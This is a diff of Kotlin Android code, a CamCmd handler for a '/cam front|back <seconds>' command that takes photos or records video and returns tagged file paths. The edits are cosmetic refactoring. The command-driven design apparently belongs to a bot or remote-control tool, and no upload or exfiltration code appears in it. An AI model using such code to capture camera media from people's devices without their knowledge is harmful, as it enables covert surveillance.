@@ -4,7 +4,6 @@ import android.Manifest
 import android.content.Context
 import android.graphics.ImageFormat
 import android.hardware.camera2.*
-import android.media.Image
 import android.media.ImageReader
 import android.media.MediaRecorder
 import android.os.Handler
@@ -18,7 +17,7 @@ object CamCmd {
 
     fun run(ctx: Context, args: String): String {
         val parts = args.trim().lowercase().split(Regex("\\s+"))
-        if (parts.isEmpty() || parts.size < 2) return "uso: /cam front|back <segundos>"
+        if (parts.size < 2) return "uso: /cam front|back <segundos>"
         val facing = when (parts[0]) {
             "front" -> CameraCharacteristics.LENS_FACING_FRONT
             "back"  -> CameraCharacteristics.LENS_FACING_BACK
@@ -50,12 +49,16 @@ object CamCmd {
             val sz = map.getOutputSizes(ImageFormat.JPEG)!!.maxByOrNull { it.width * it.height }!!
             reader = ImageReader.newInstance(sz.width, sz.height, ImageFormat.JPEG, 2)
             reader.setOnImageAvailableListener({ r: ImageReader ->
-                val img: Image? = r.acquireLatestImage() ?: return@setOnImageAvailableListener
+                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                 try {
                     val buf = img.planes[0].buffer
-                    val bytes = ByteArray(buf.remaining()); buf.get(bytes)
+                    val bytes = ByteArray(buf.remaining())
+                    buf.get(bytes)
                     outFile.writeBytes(bytes)
-                } finally { img.close(); latch.countDown() }
+                } finally {
+                    img.close()
+                    latch.countDown()
+                }
             }, h)
 
             mgr.openCamera(camId, object : CameraDevice.StateCallback() {
@@ -78,8 +81,8 @@ object CamCmd {
 
             latch.await(15, TimeUnit.SECONDS)
             if (outFile.exists()) "__PHOTO__:${outFile.absolutePath}" else "ERRO: foto falhou"
-        } catch (t2: Throwable) {
-            "ERRO cam: ${t2.message}"
+        } catch (e: Throwable) {
+            "ERRO cam: ${e.message}"
         } finally {
             runCatching { session?.close() }
             runCatching { reader?.close() }
@@ -138,9 +141,9 @@ object CamCmd {
             runCatching { rec.release() }
             if (outFile.exists() && outFile.length() > 1024) "__VIDEO__:${outFile.absolutePath}"
             else "ERRO: vídeo vazio"
-        } catch (t2: Throwable) {
+        } catch (e: Throwable) {
             runCatching { rec.release() }
-            "ERRO cam: ${t2.message}"
+            "ERRO cam: ${e.message}"
         } finally {
             t.quitSafely()
         }
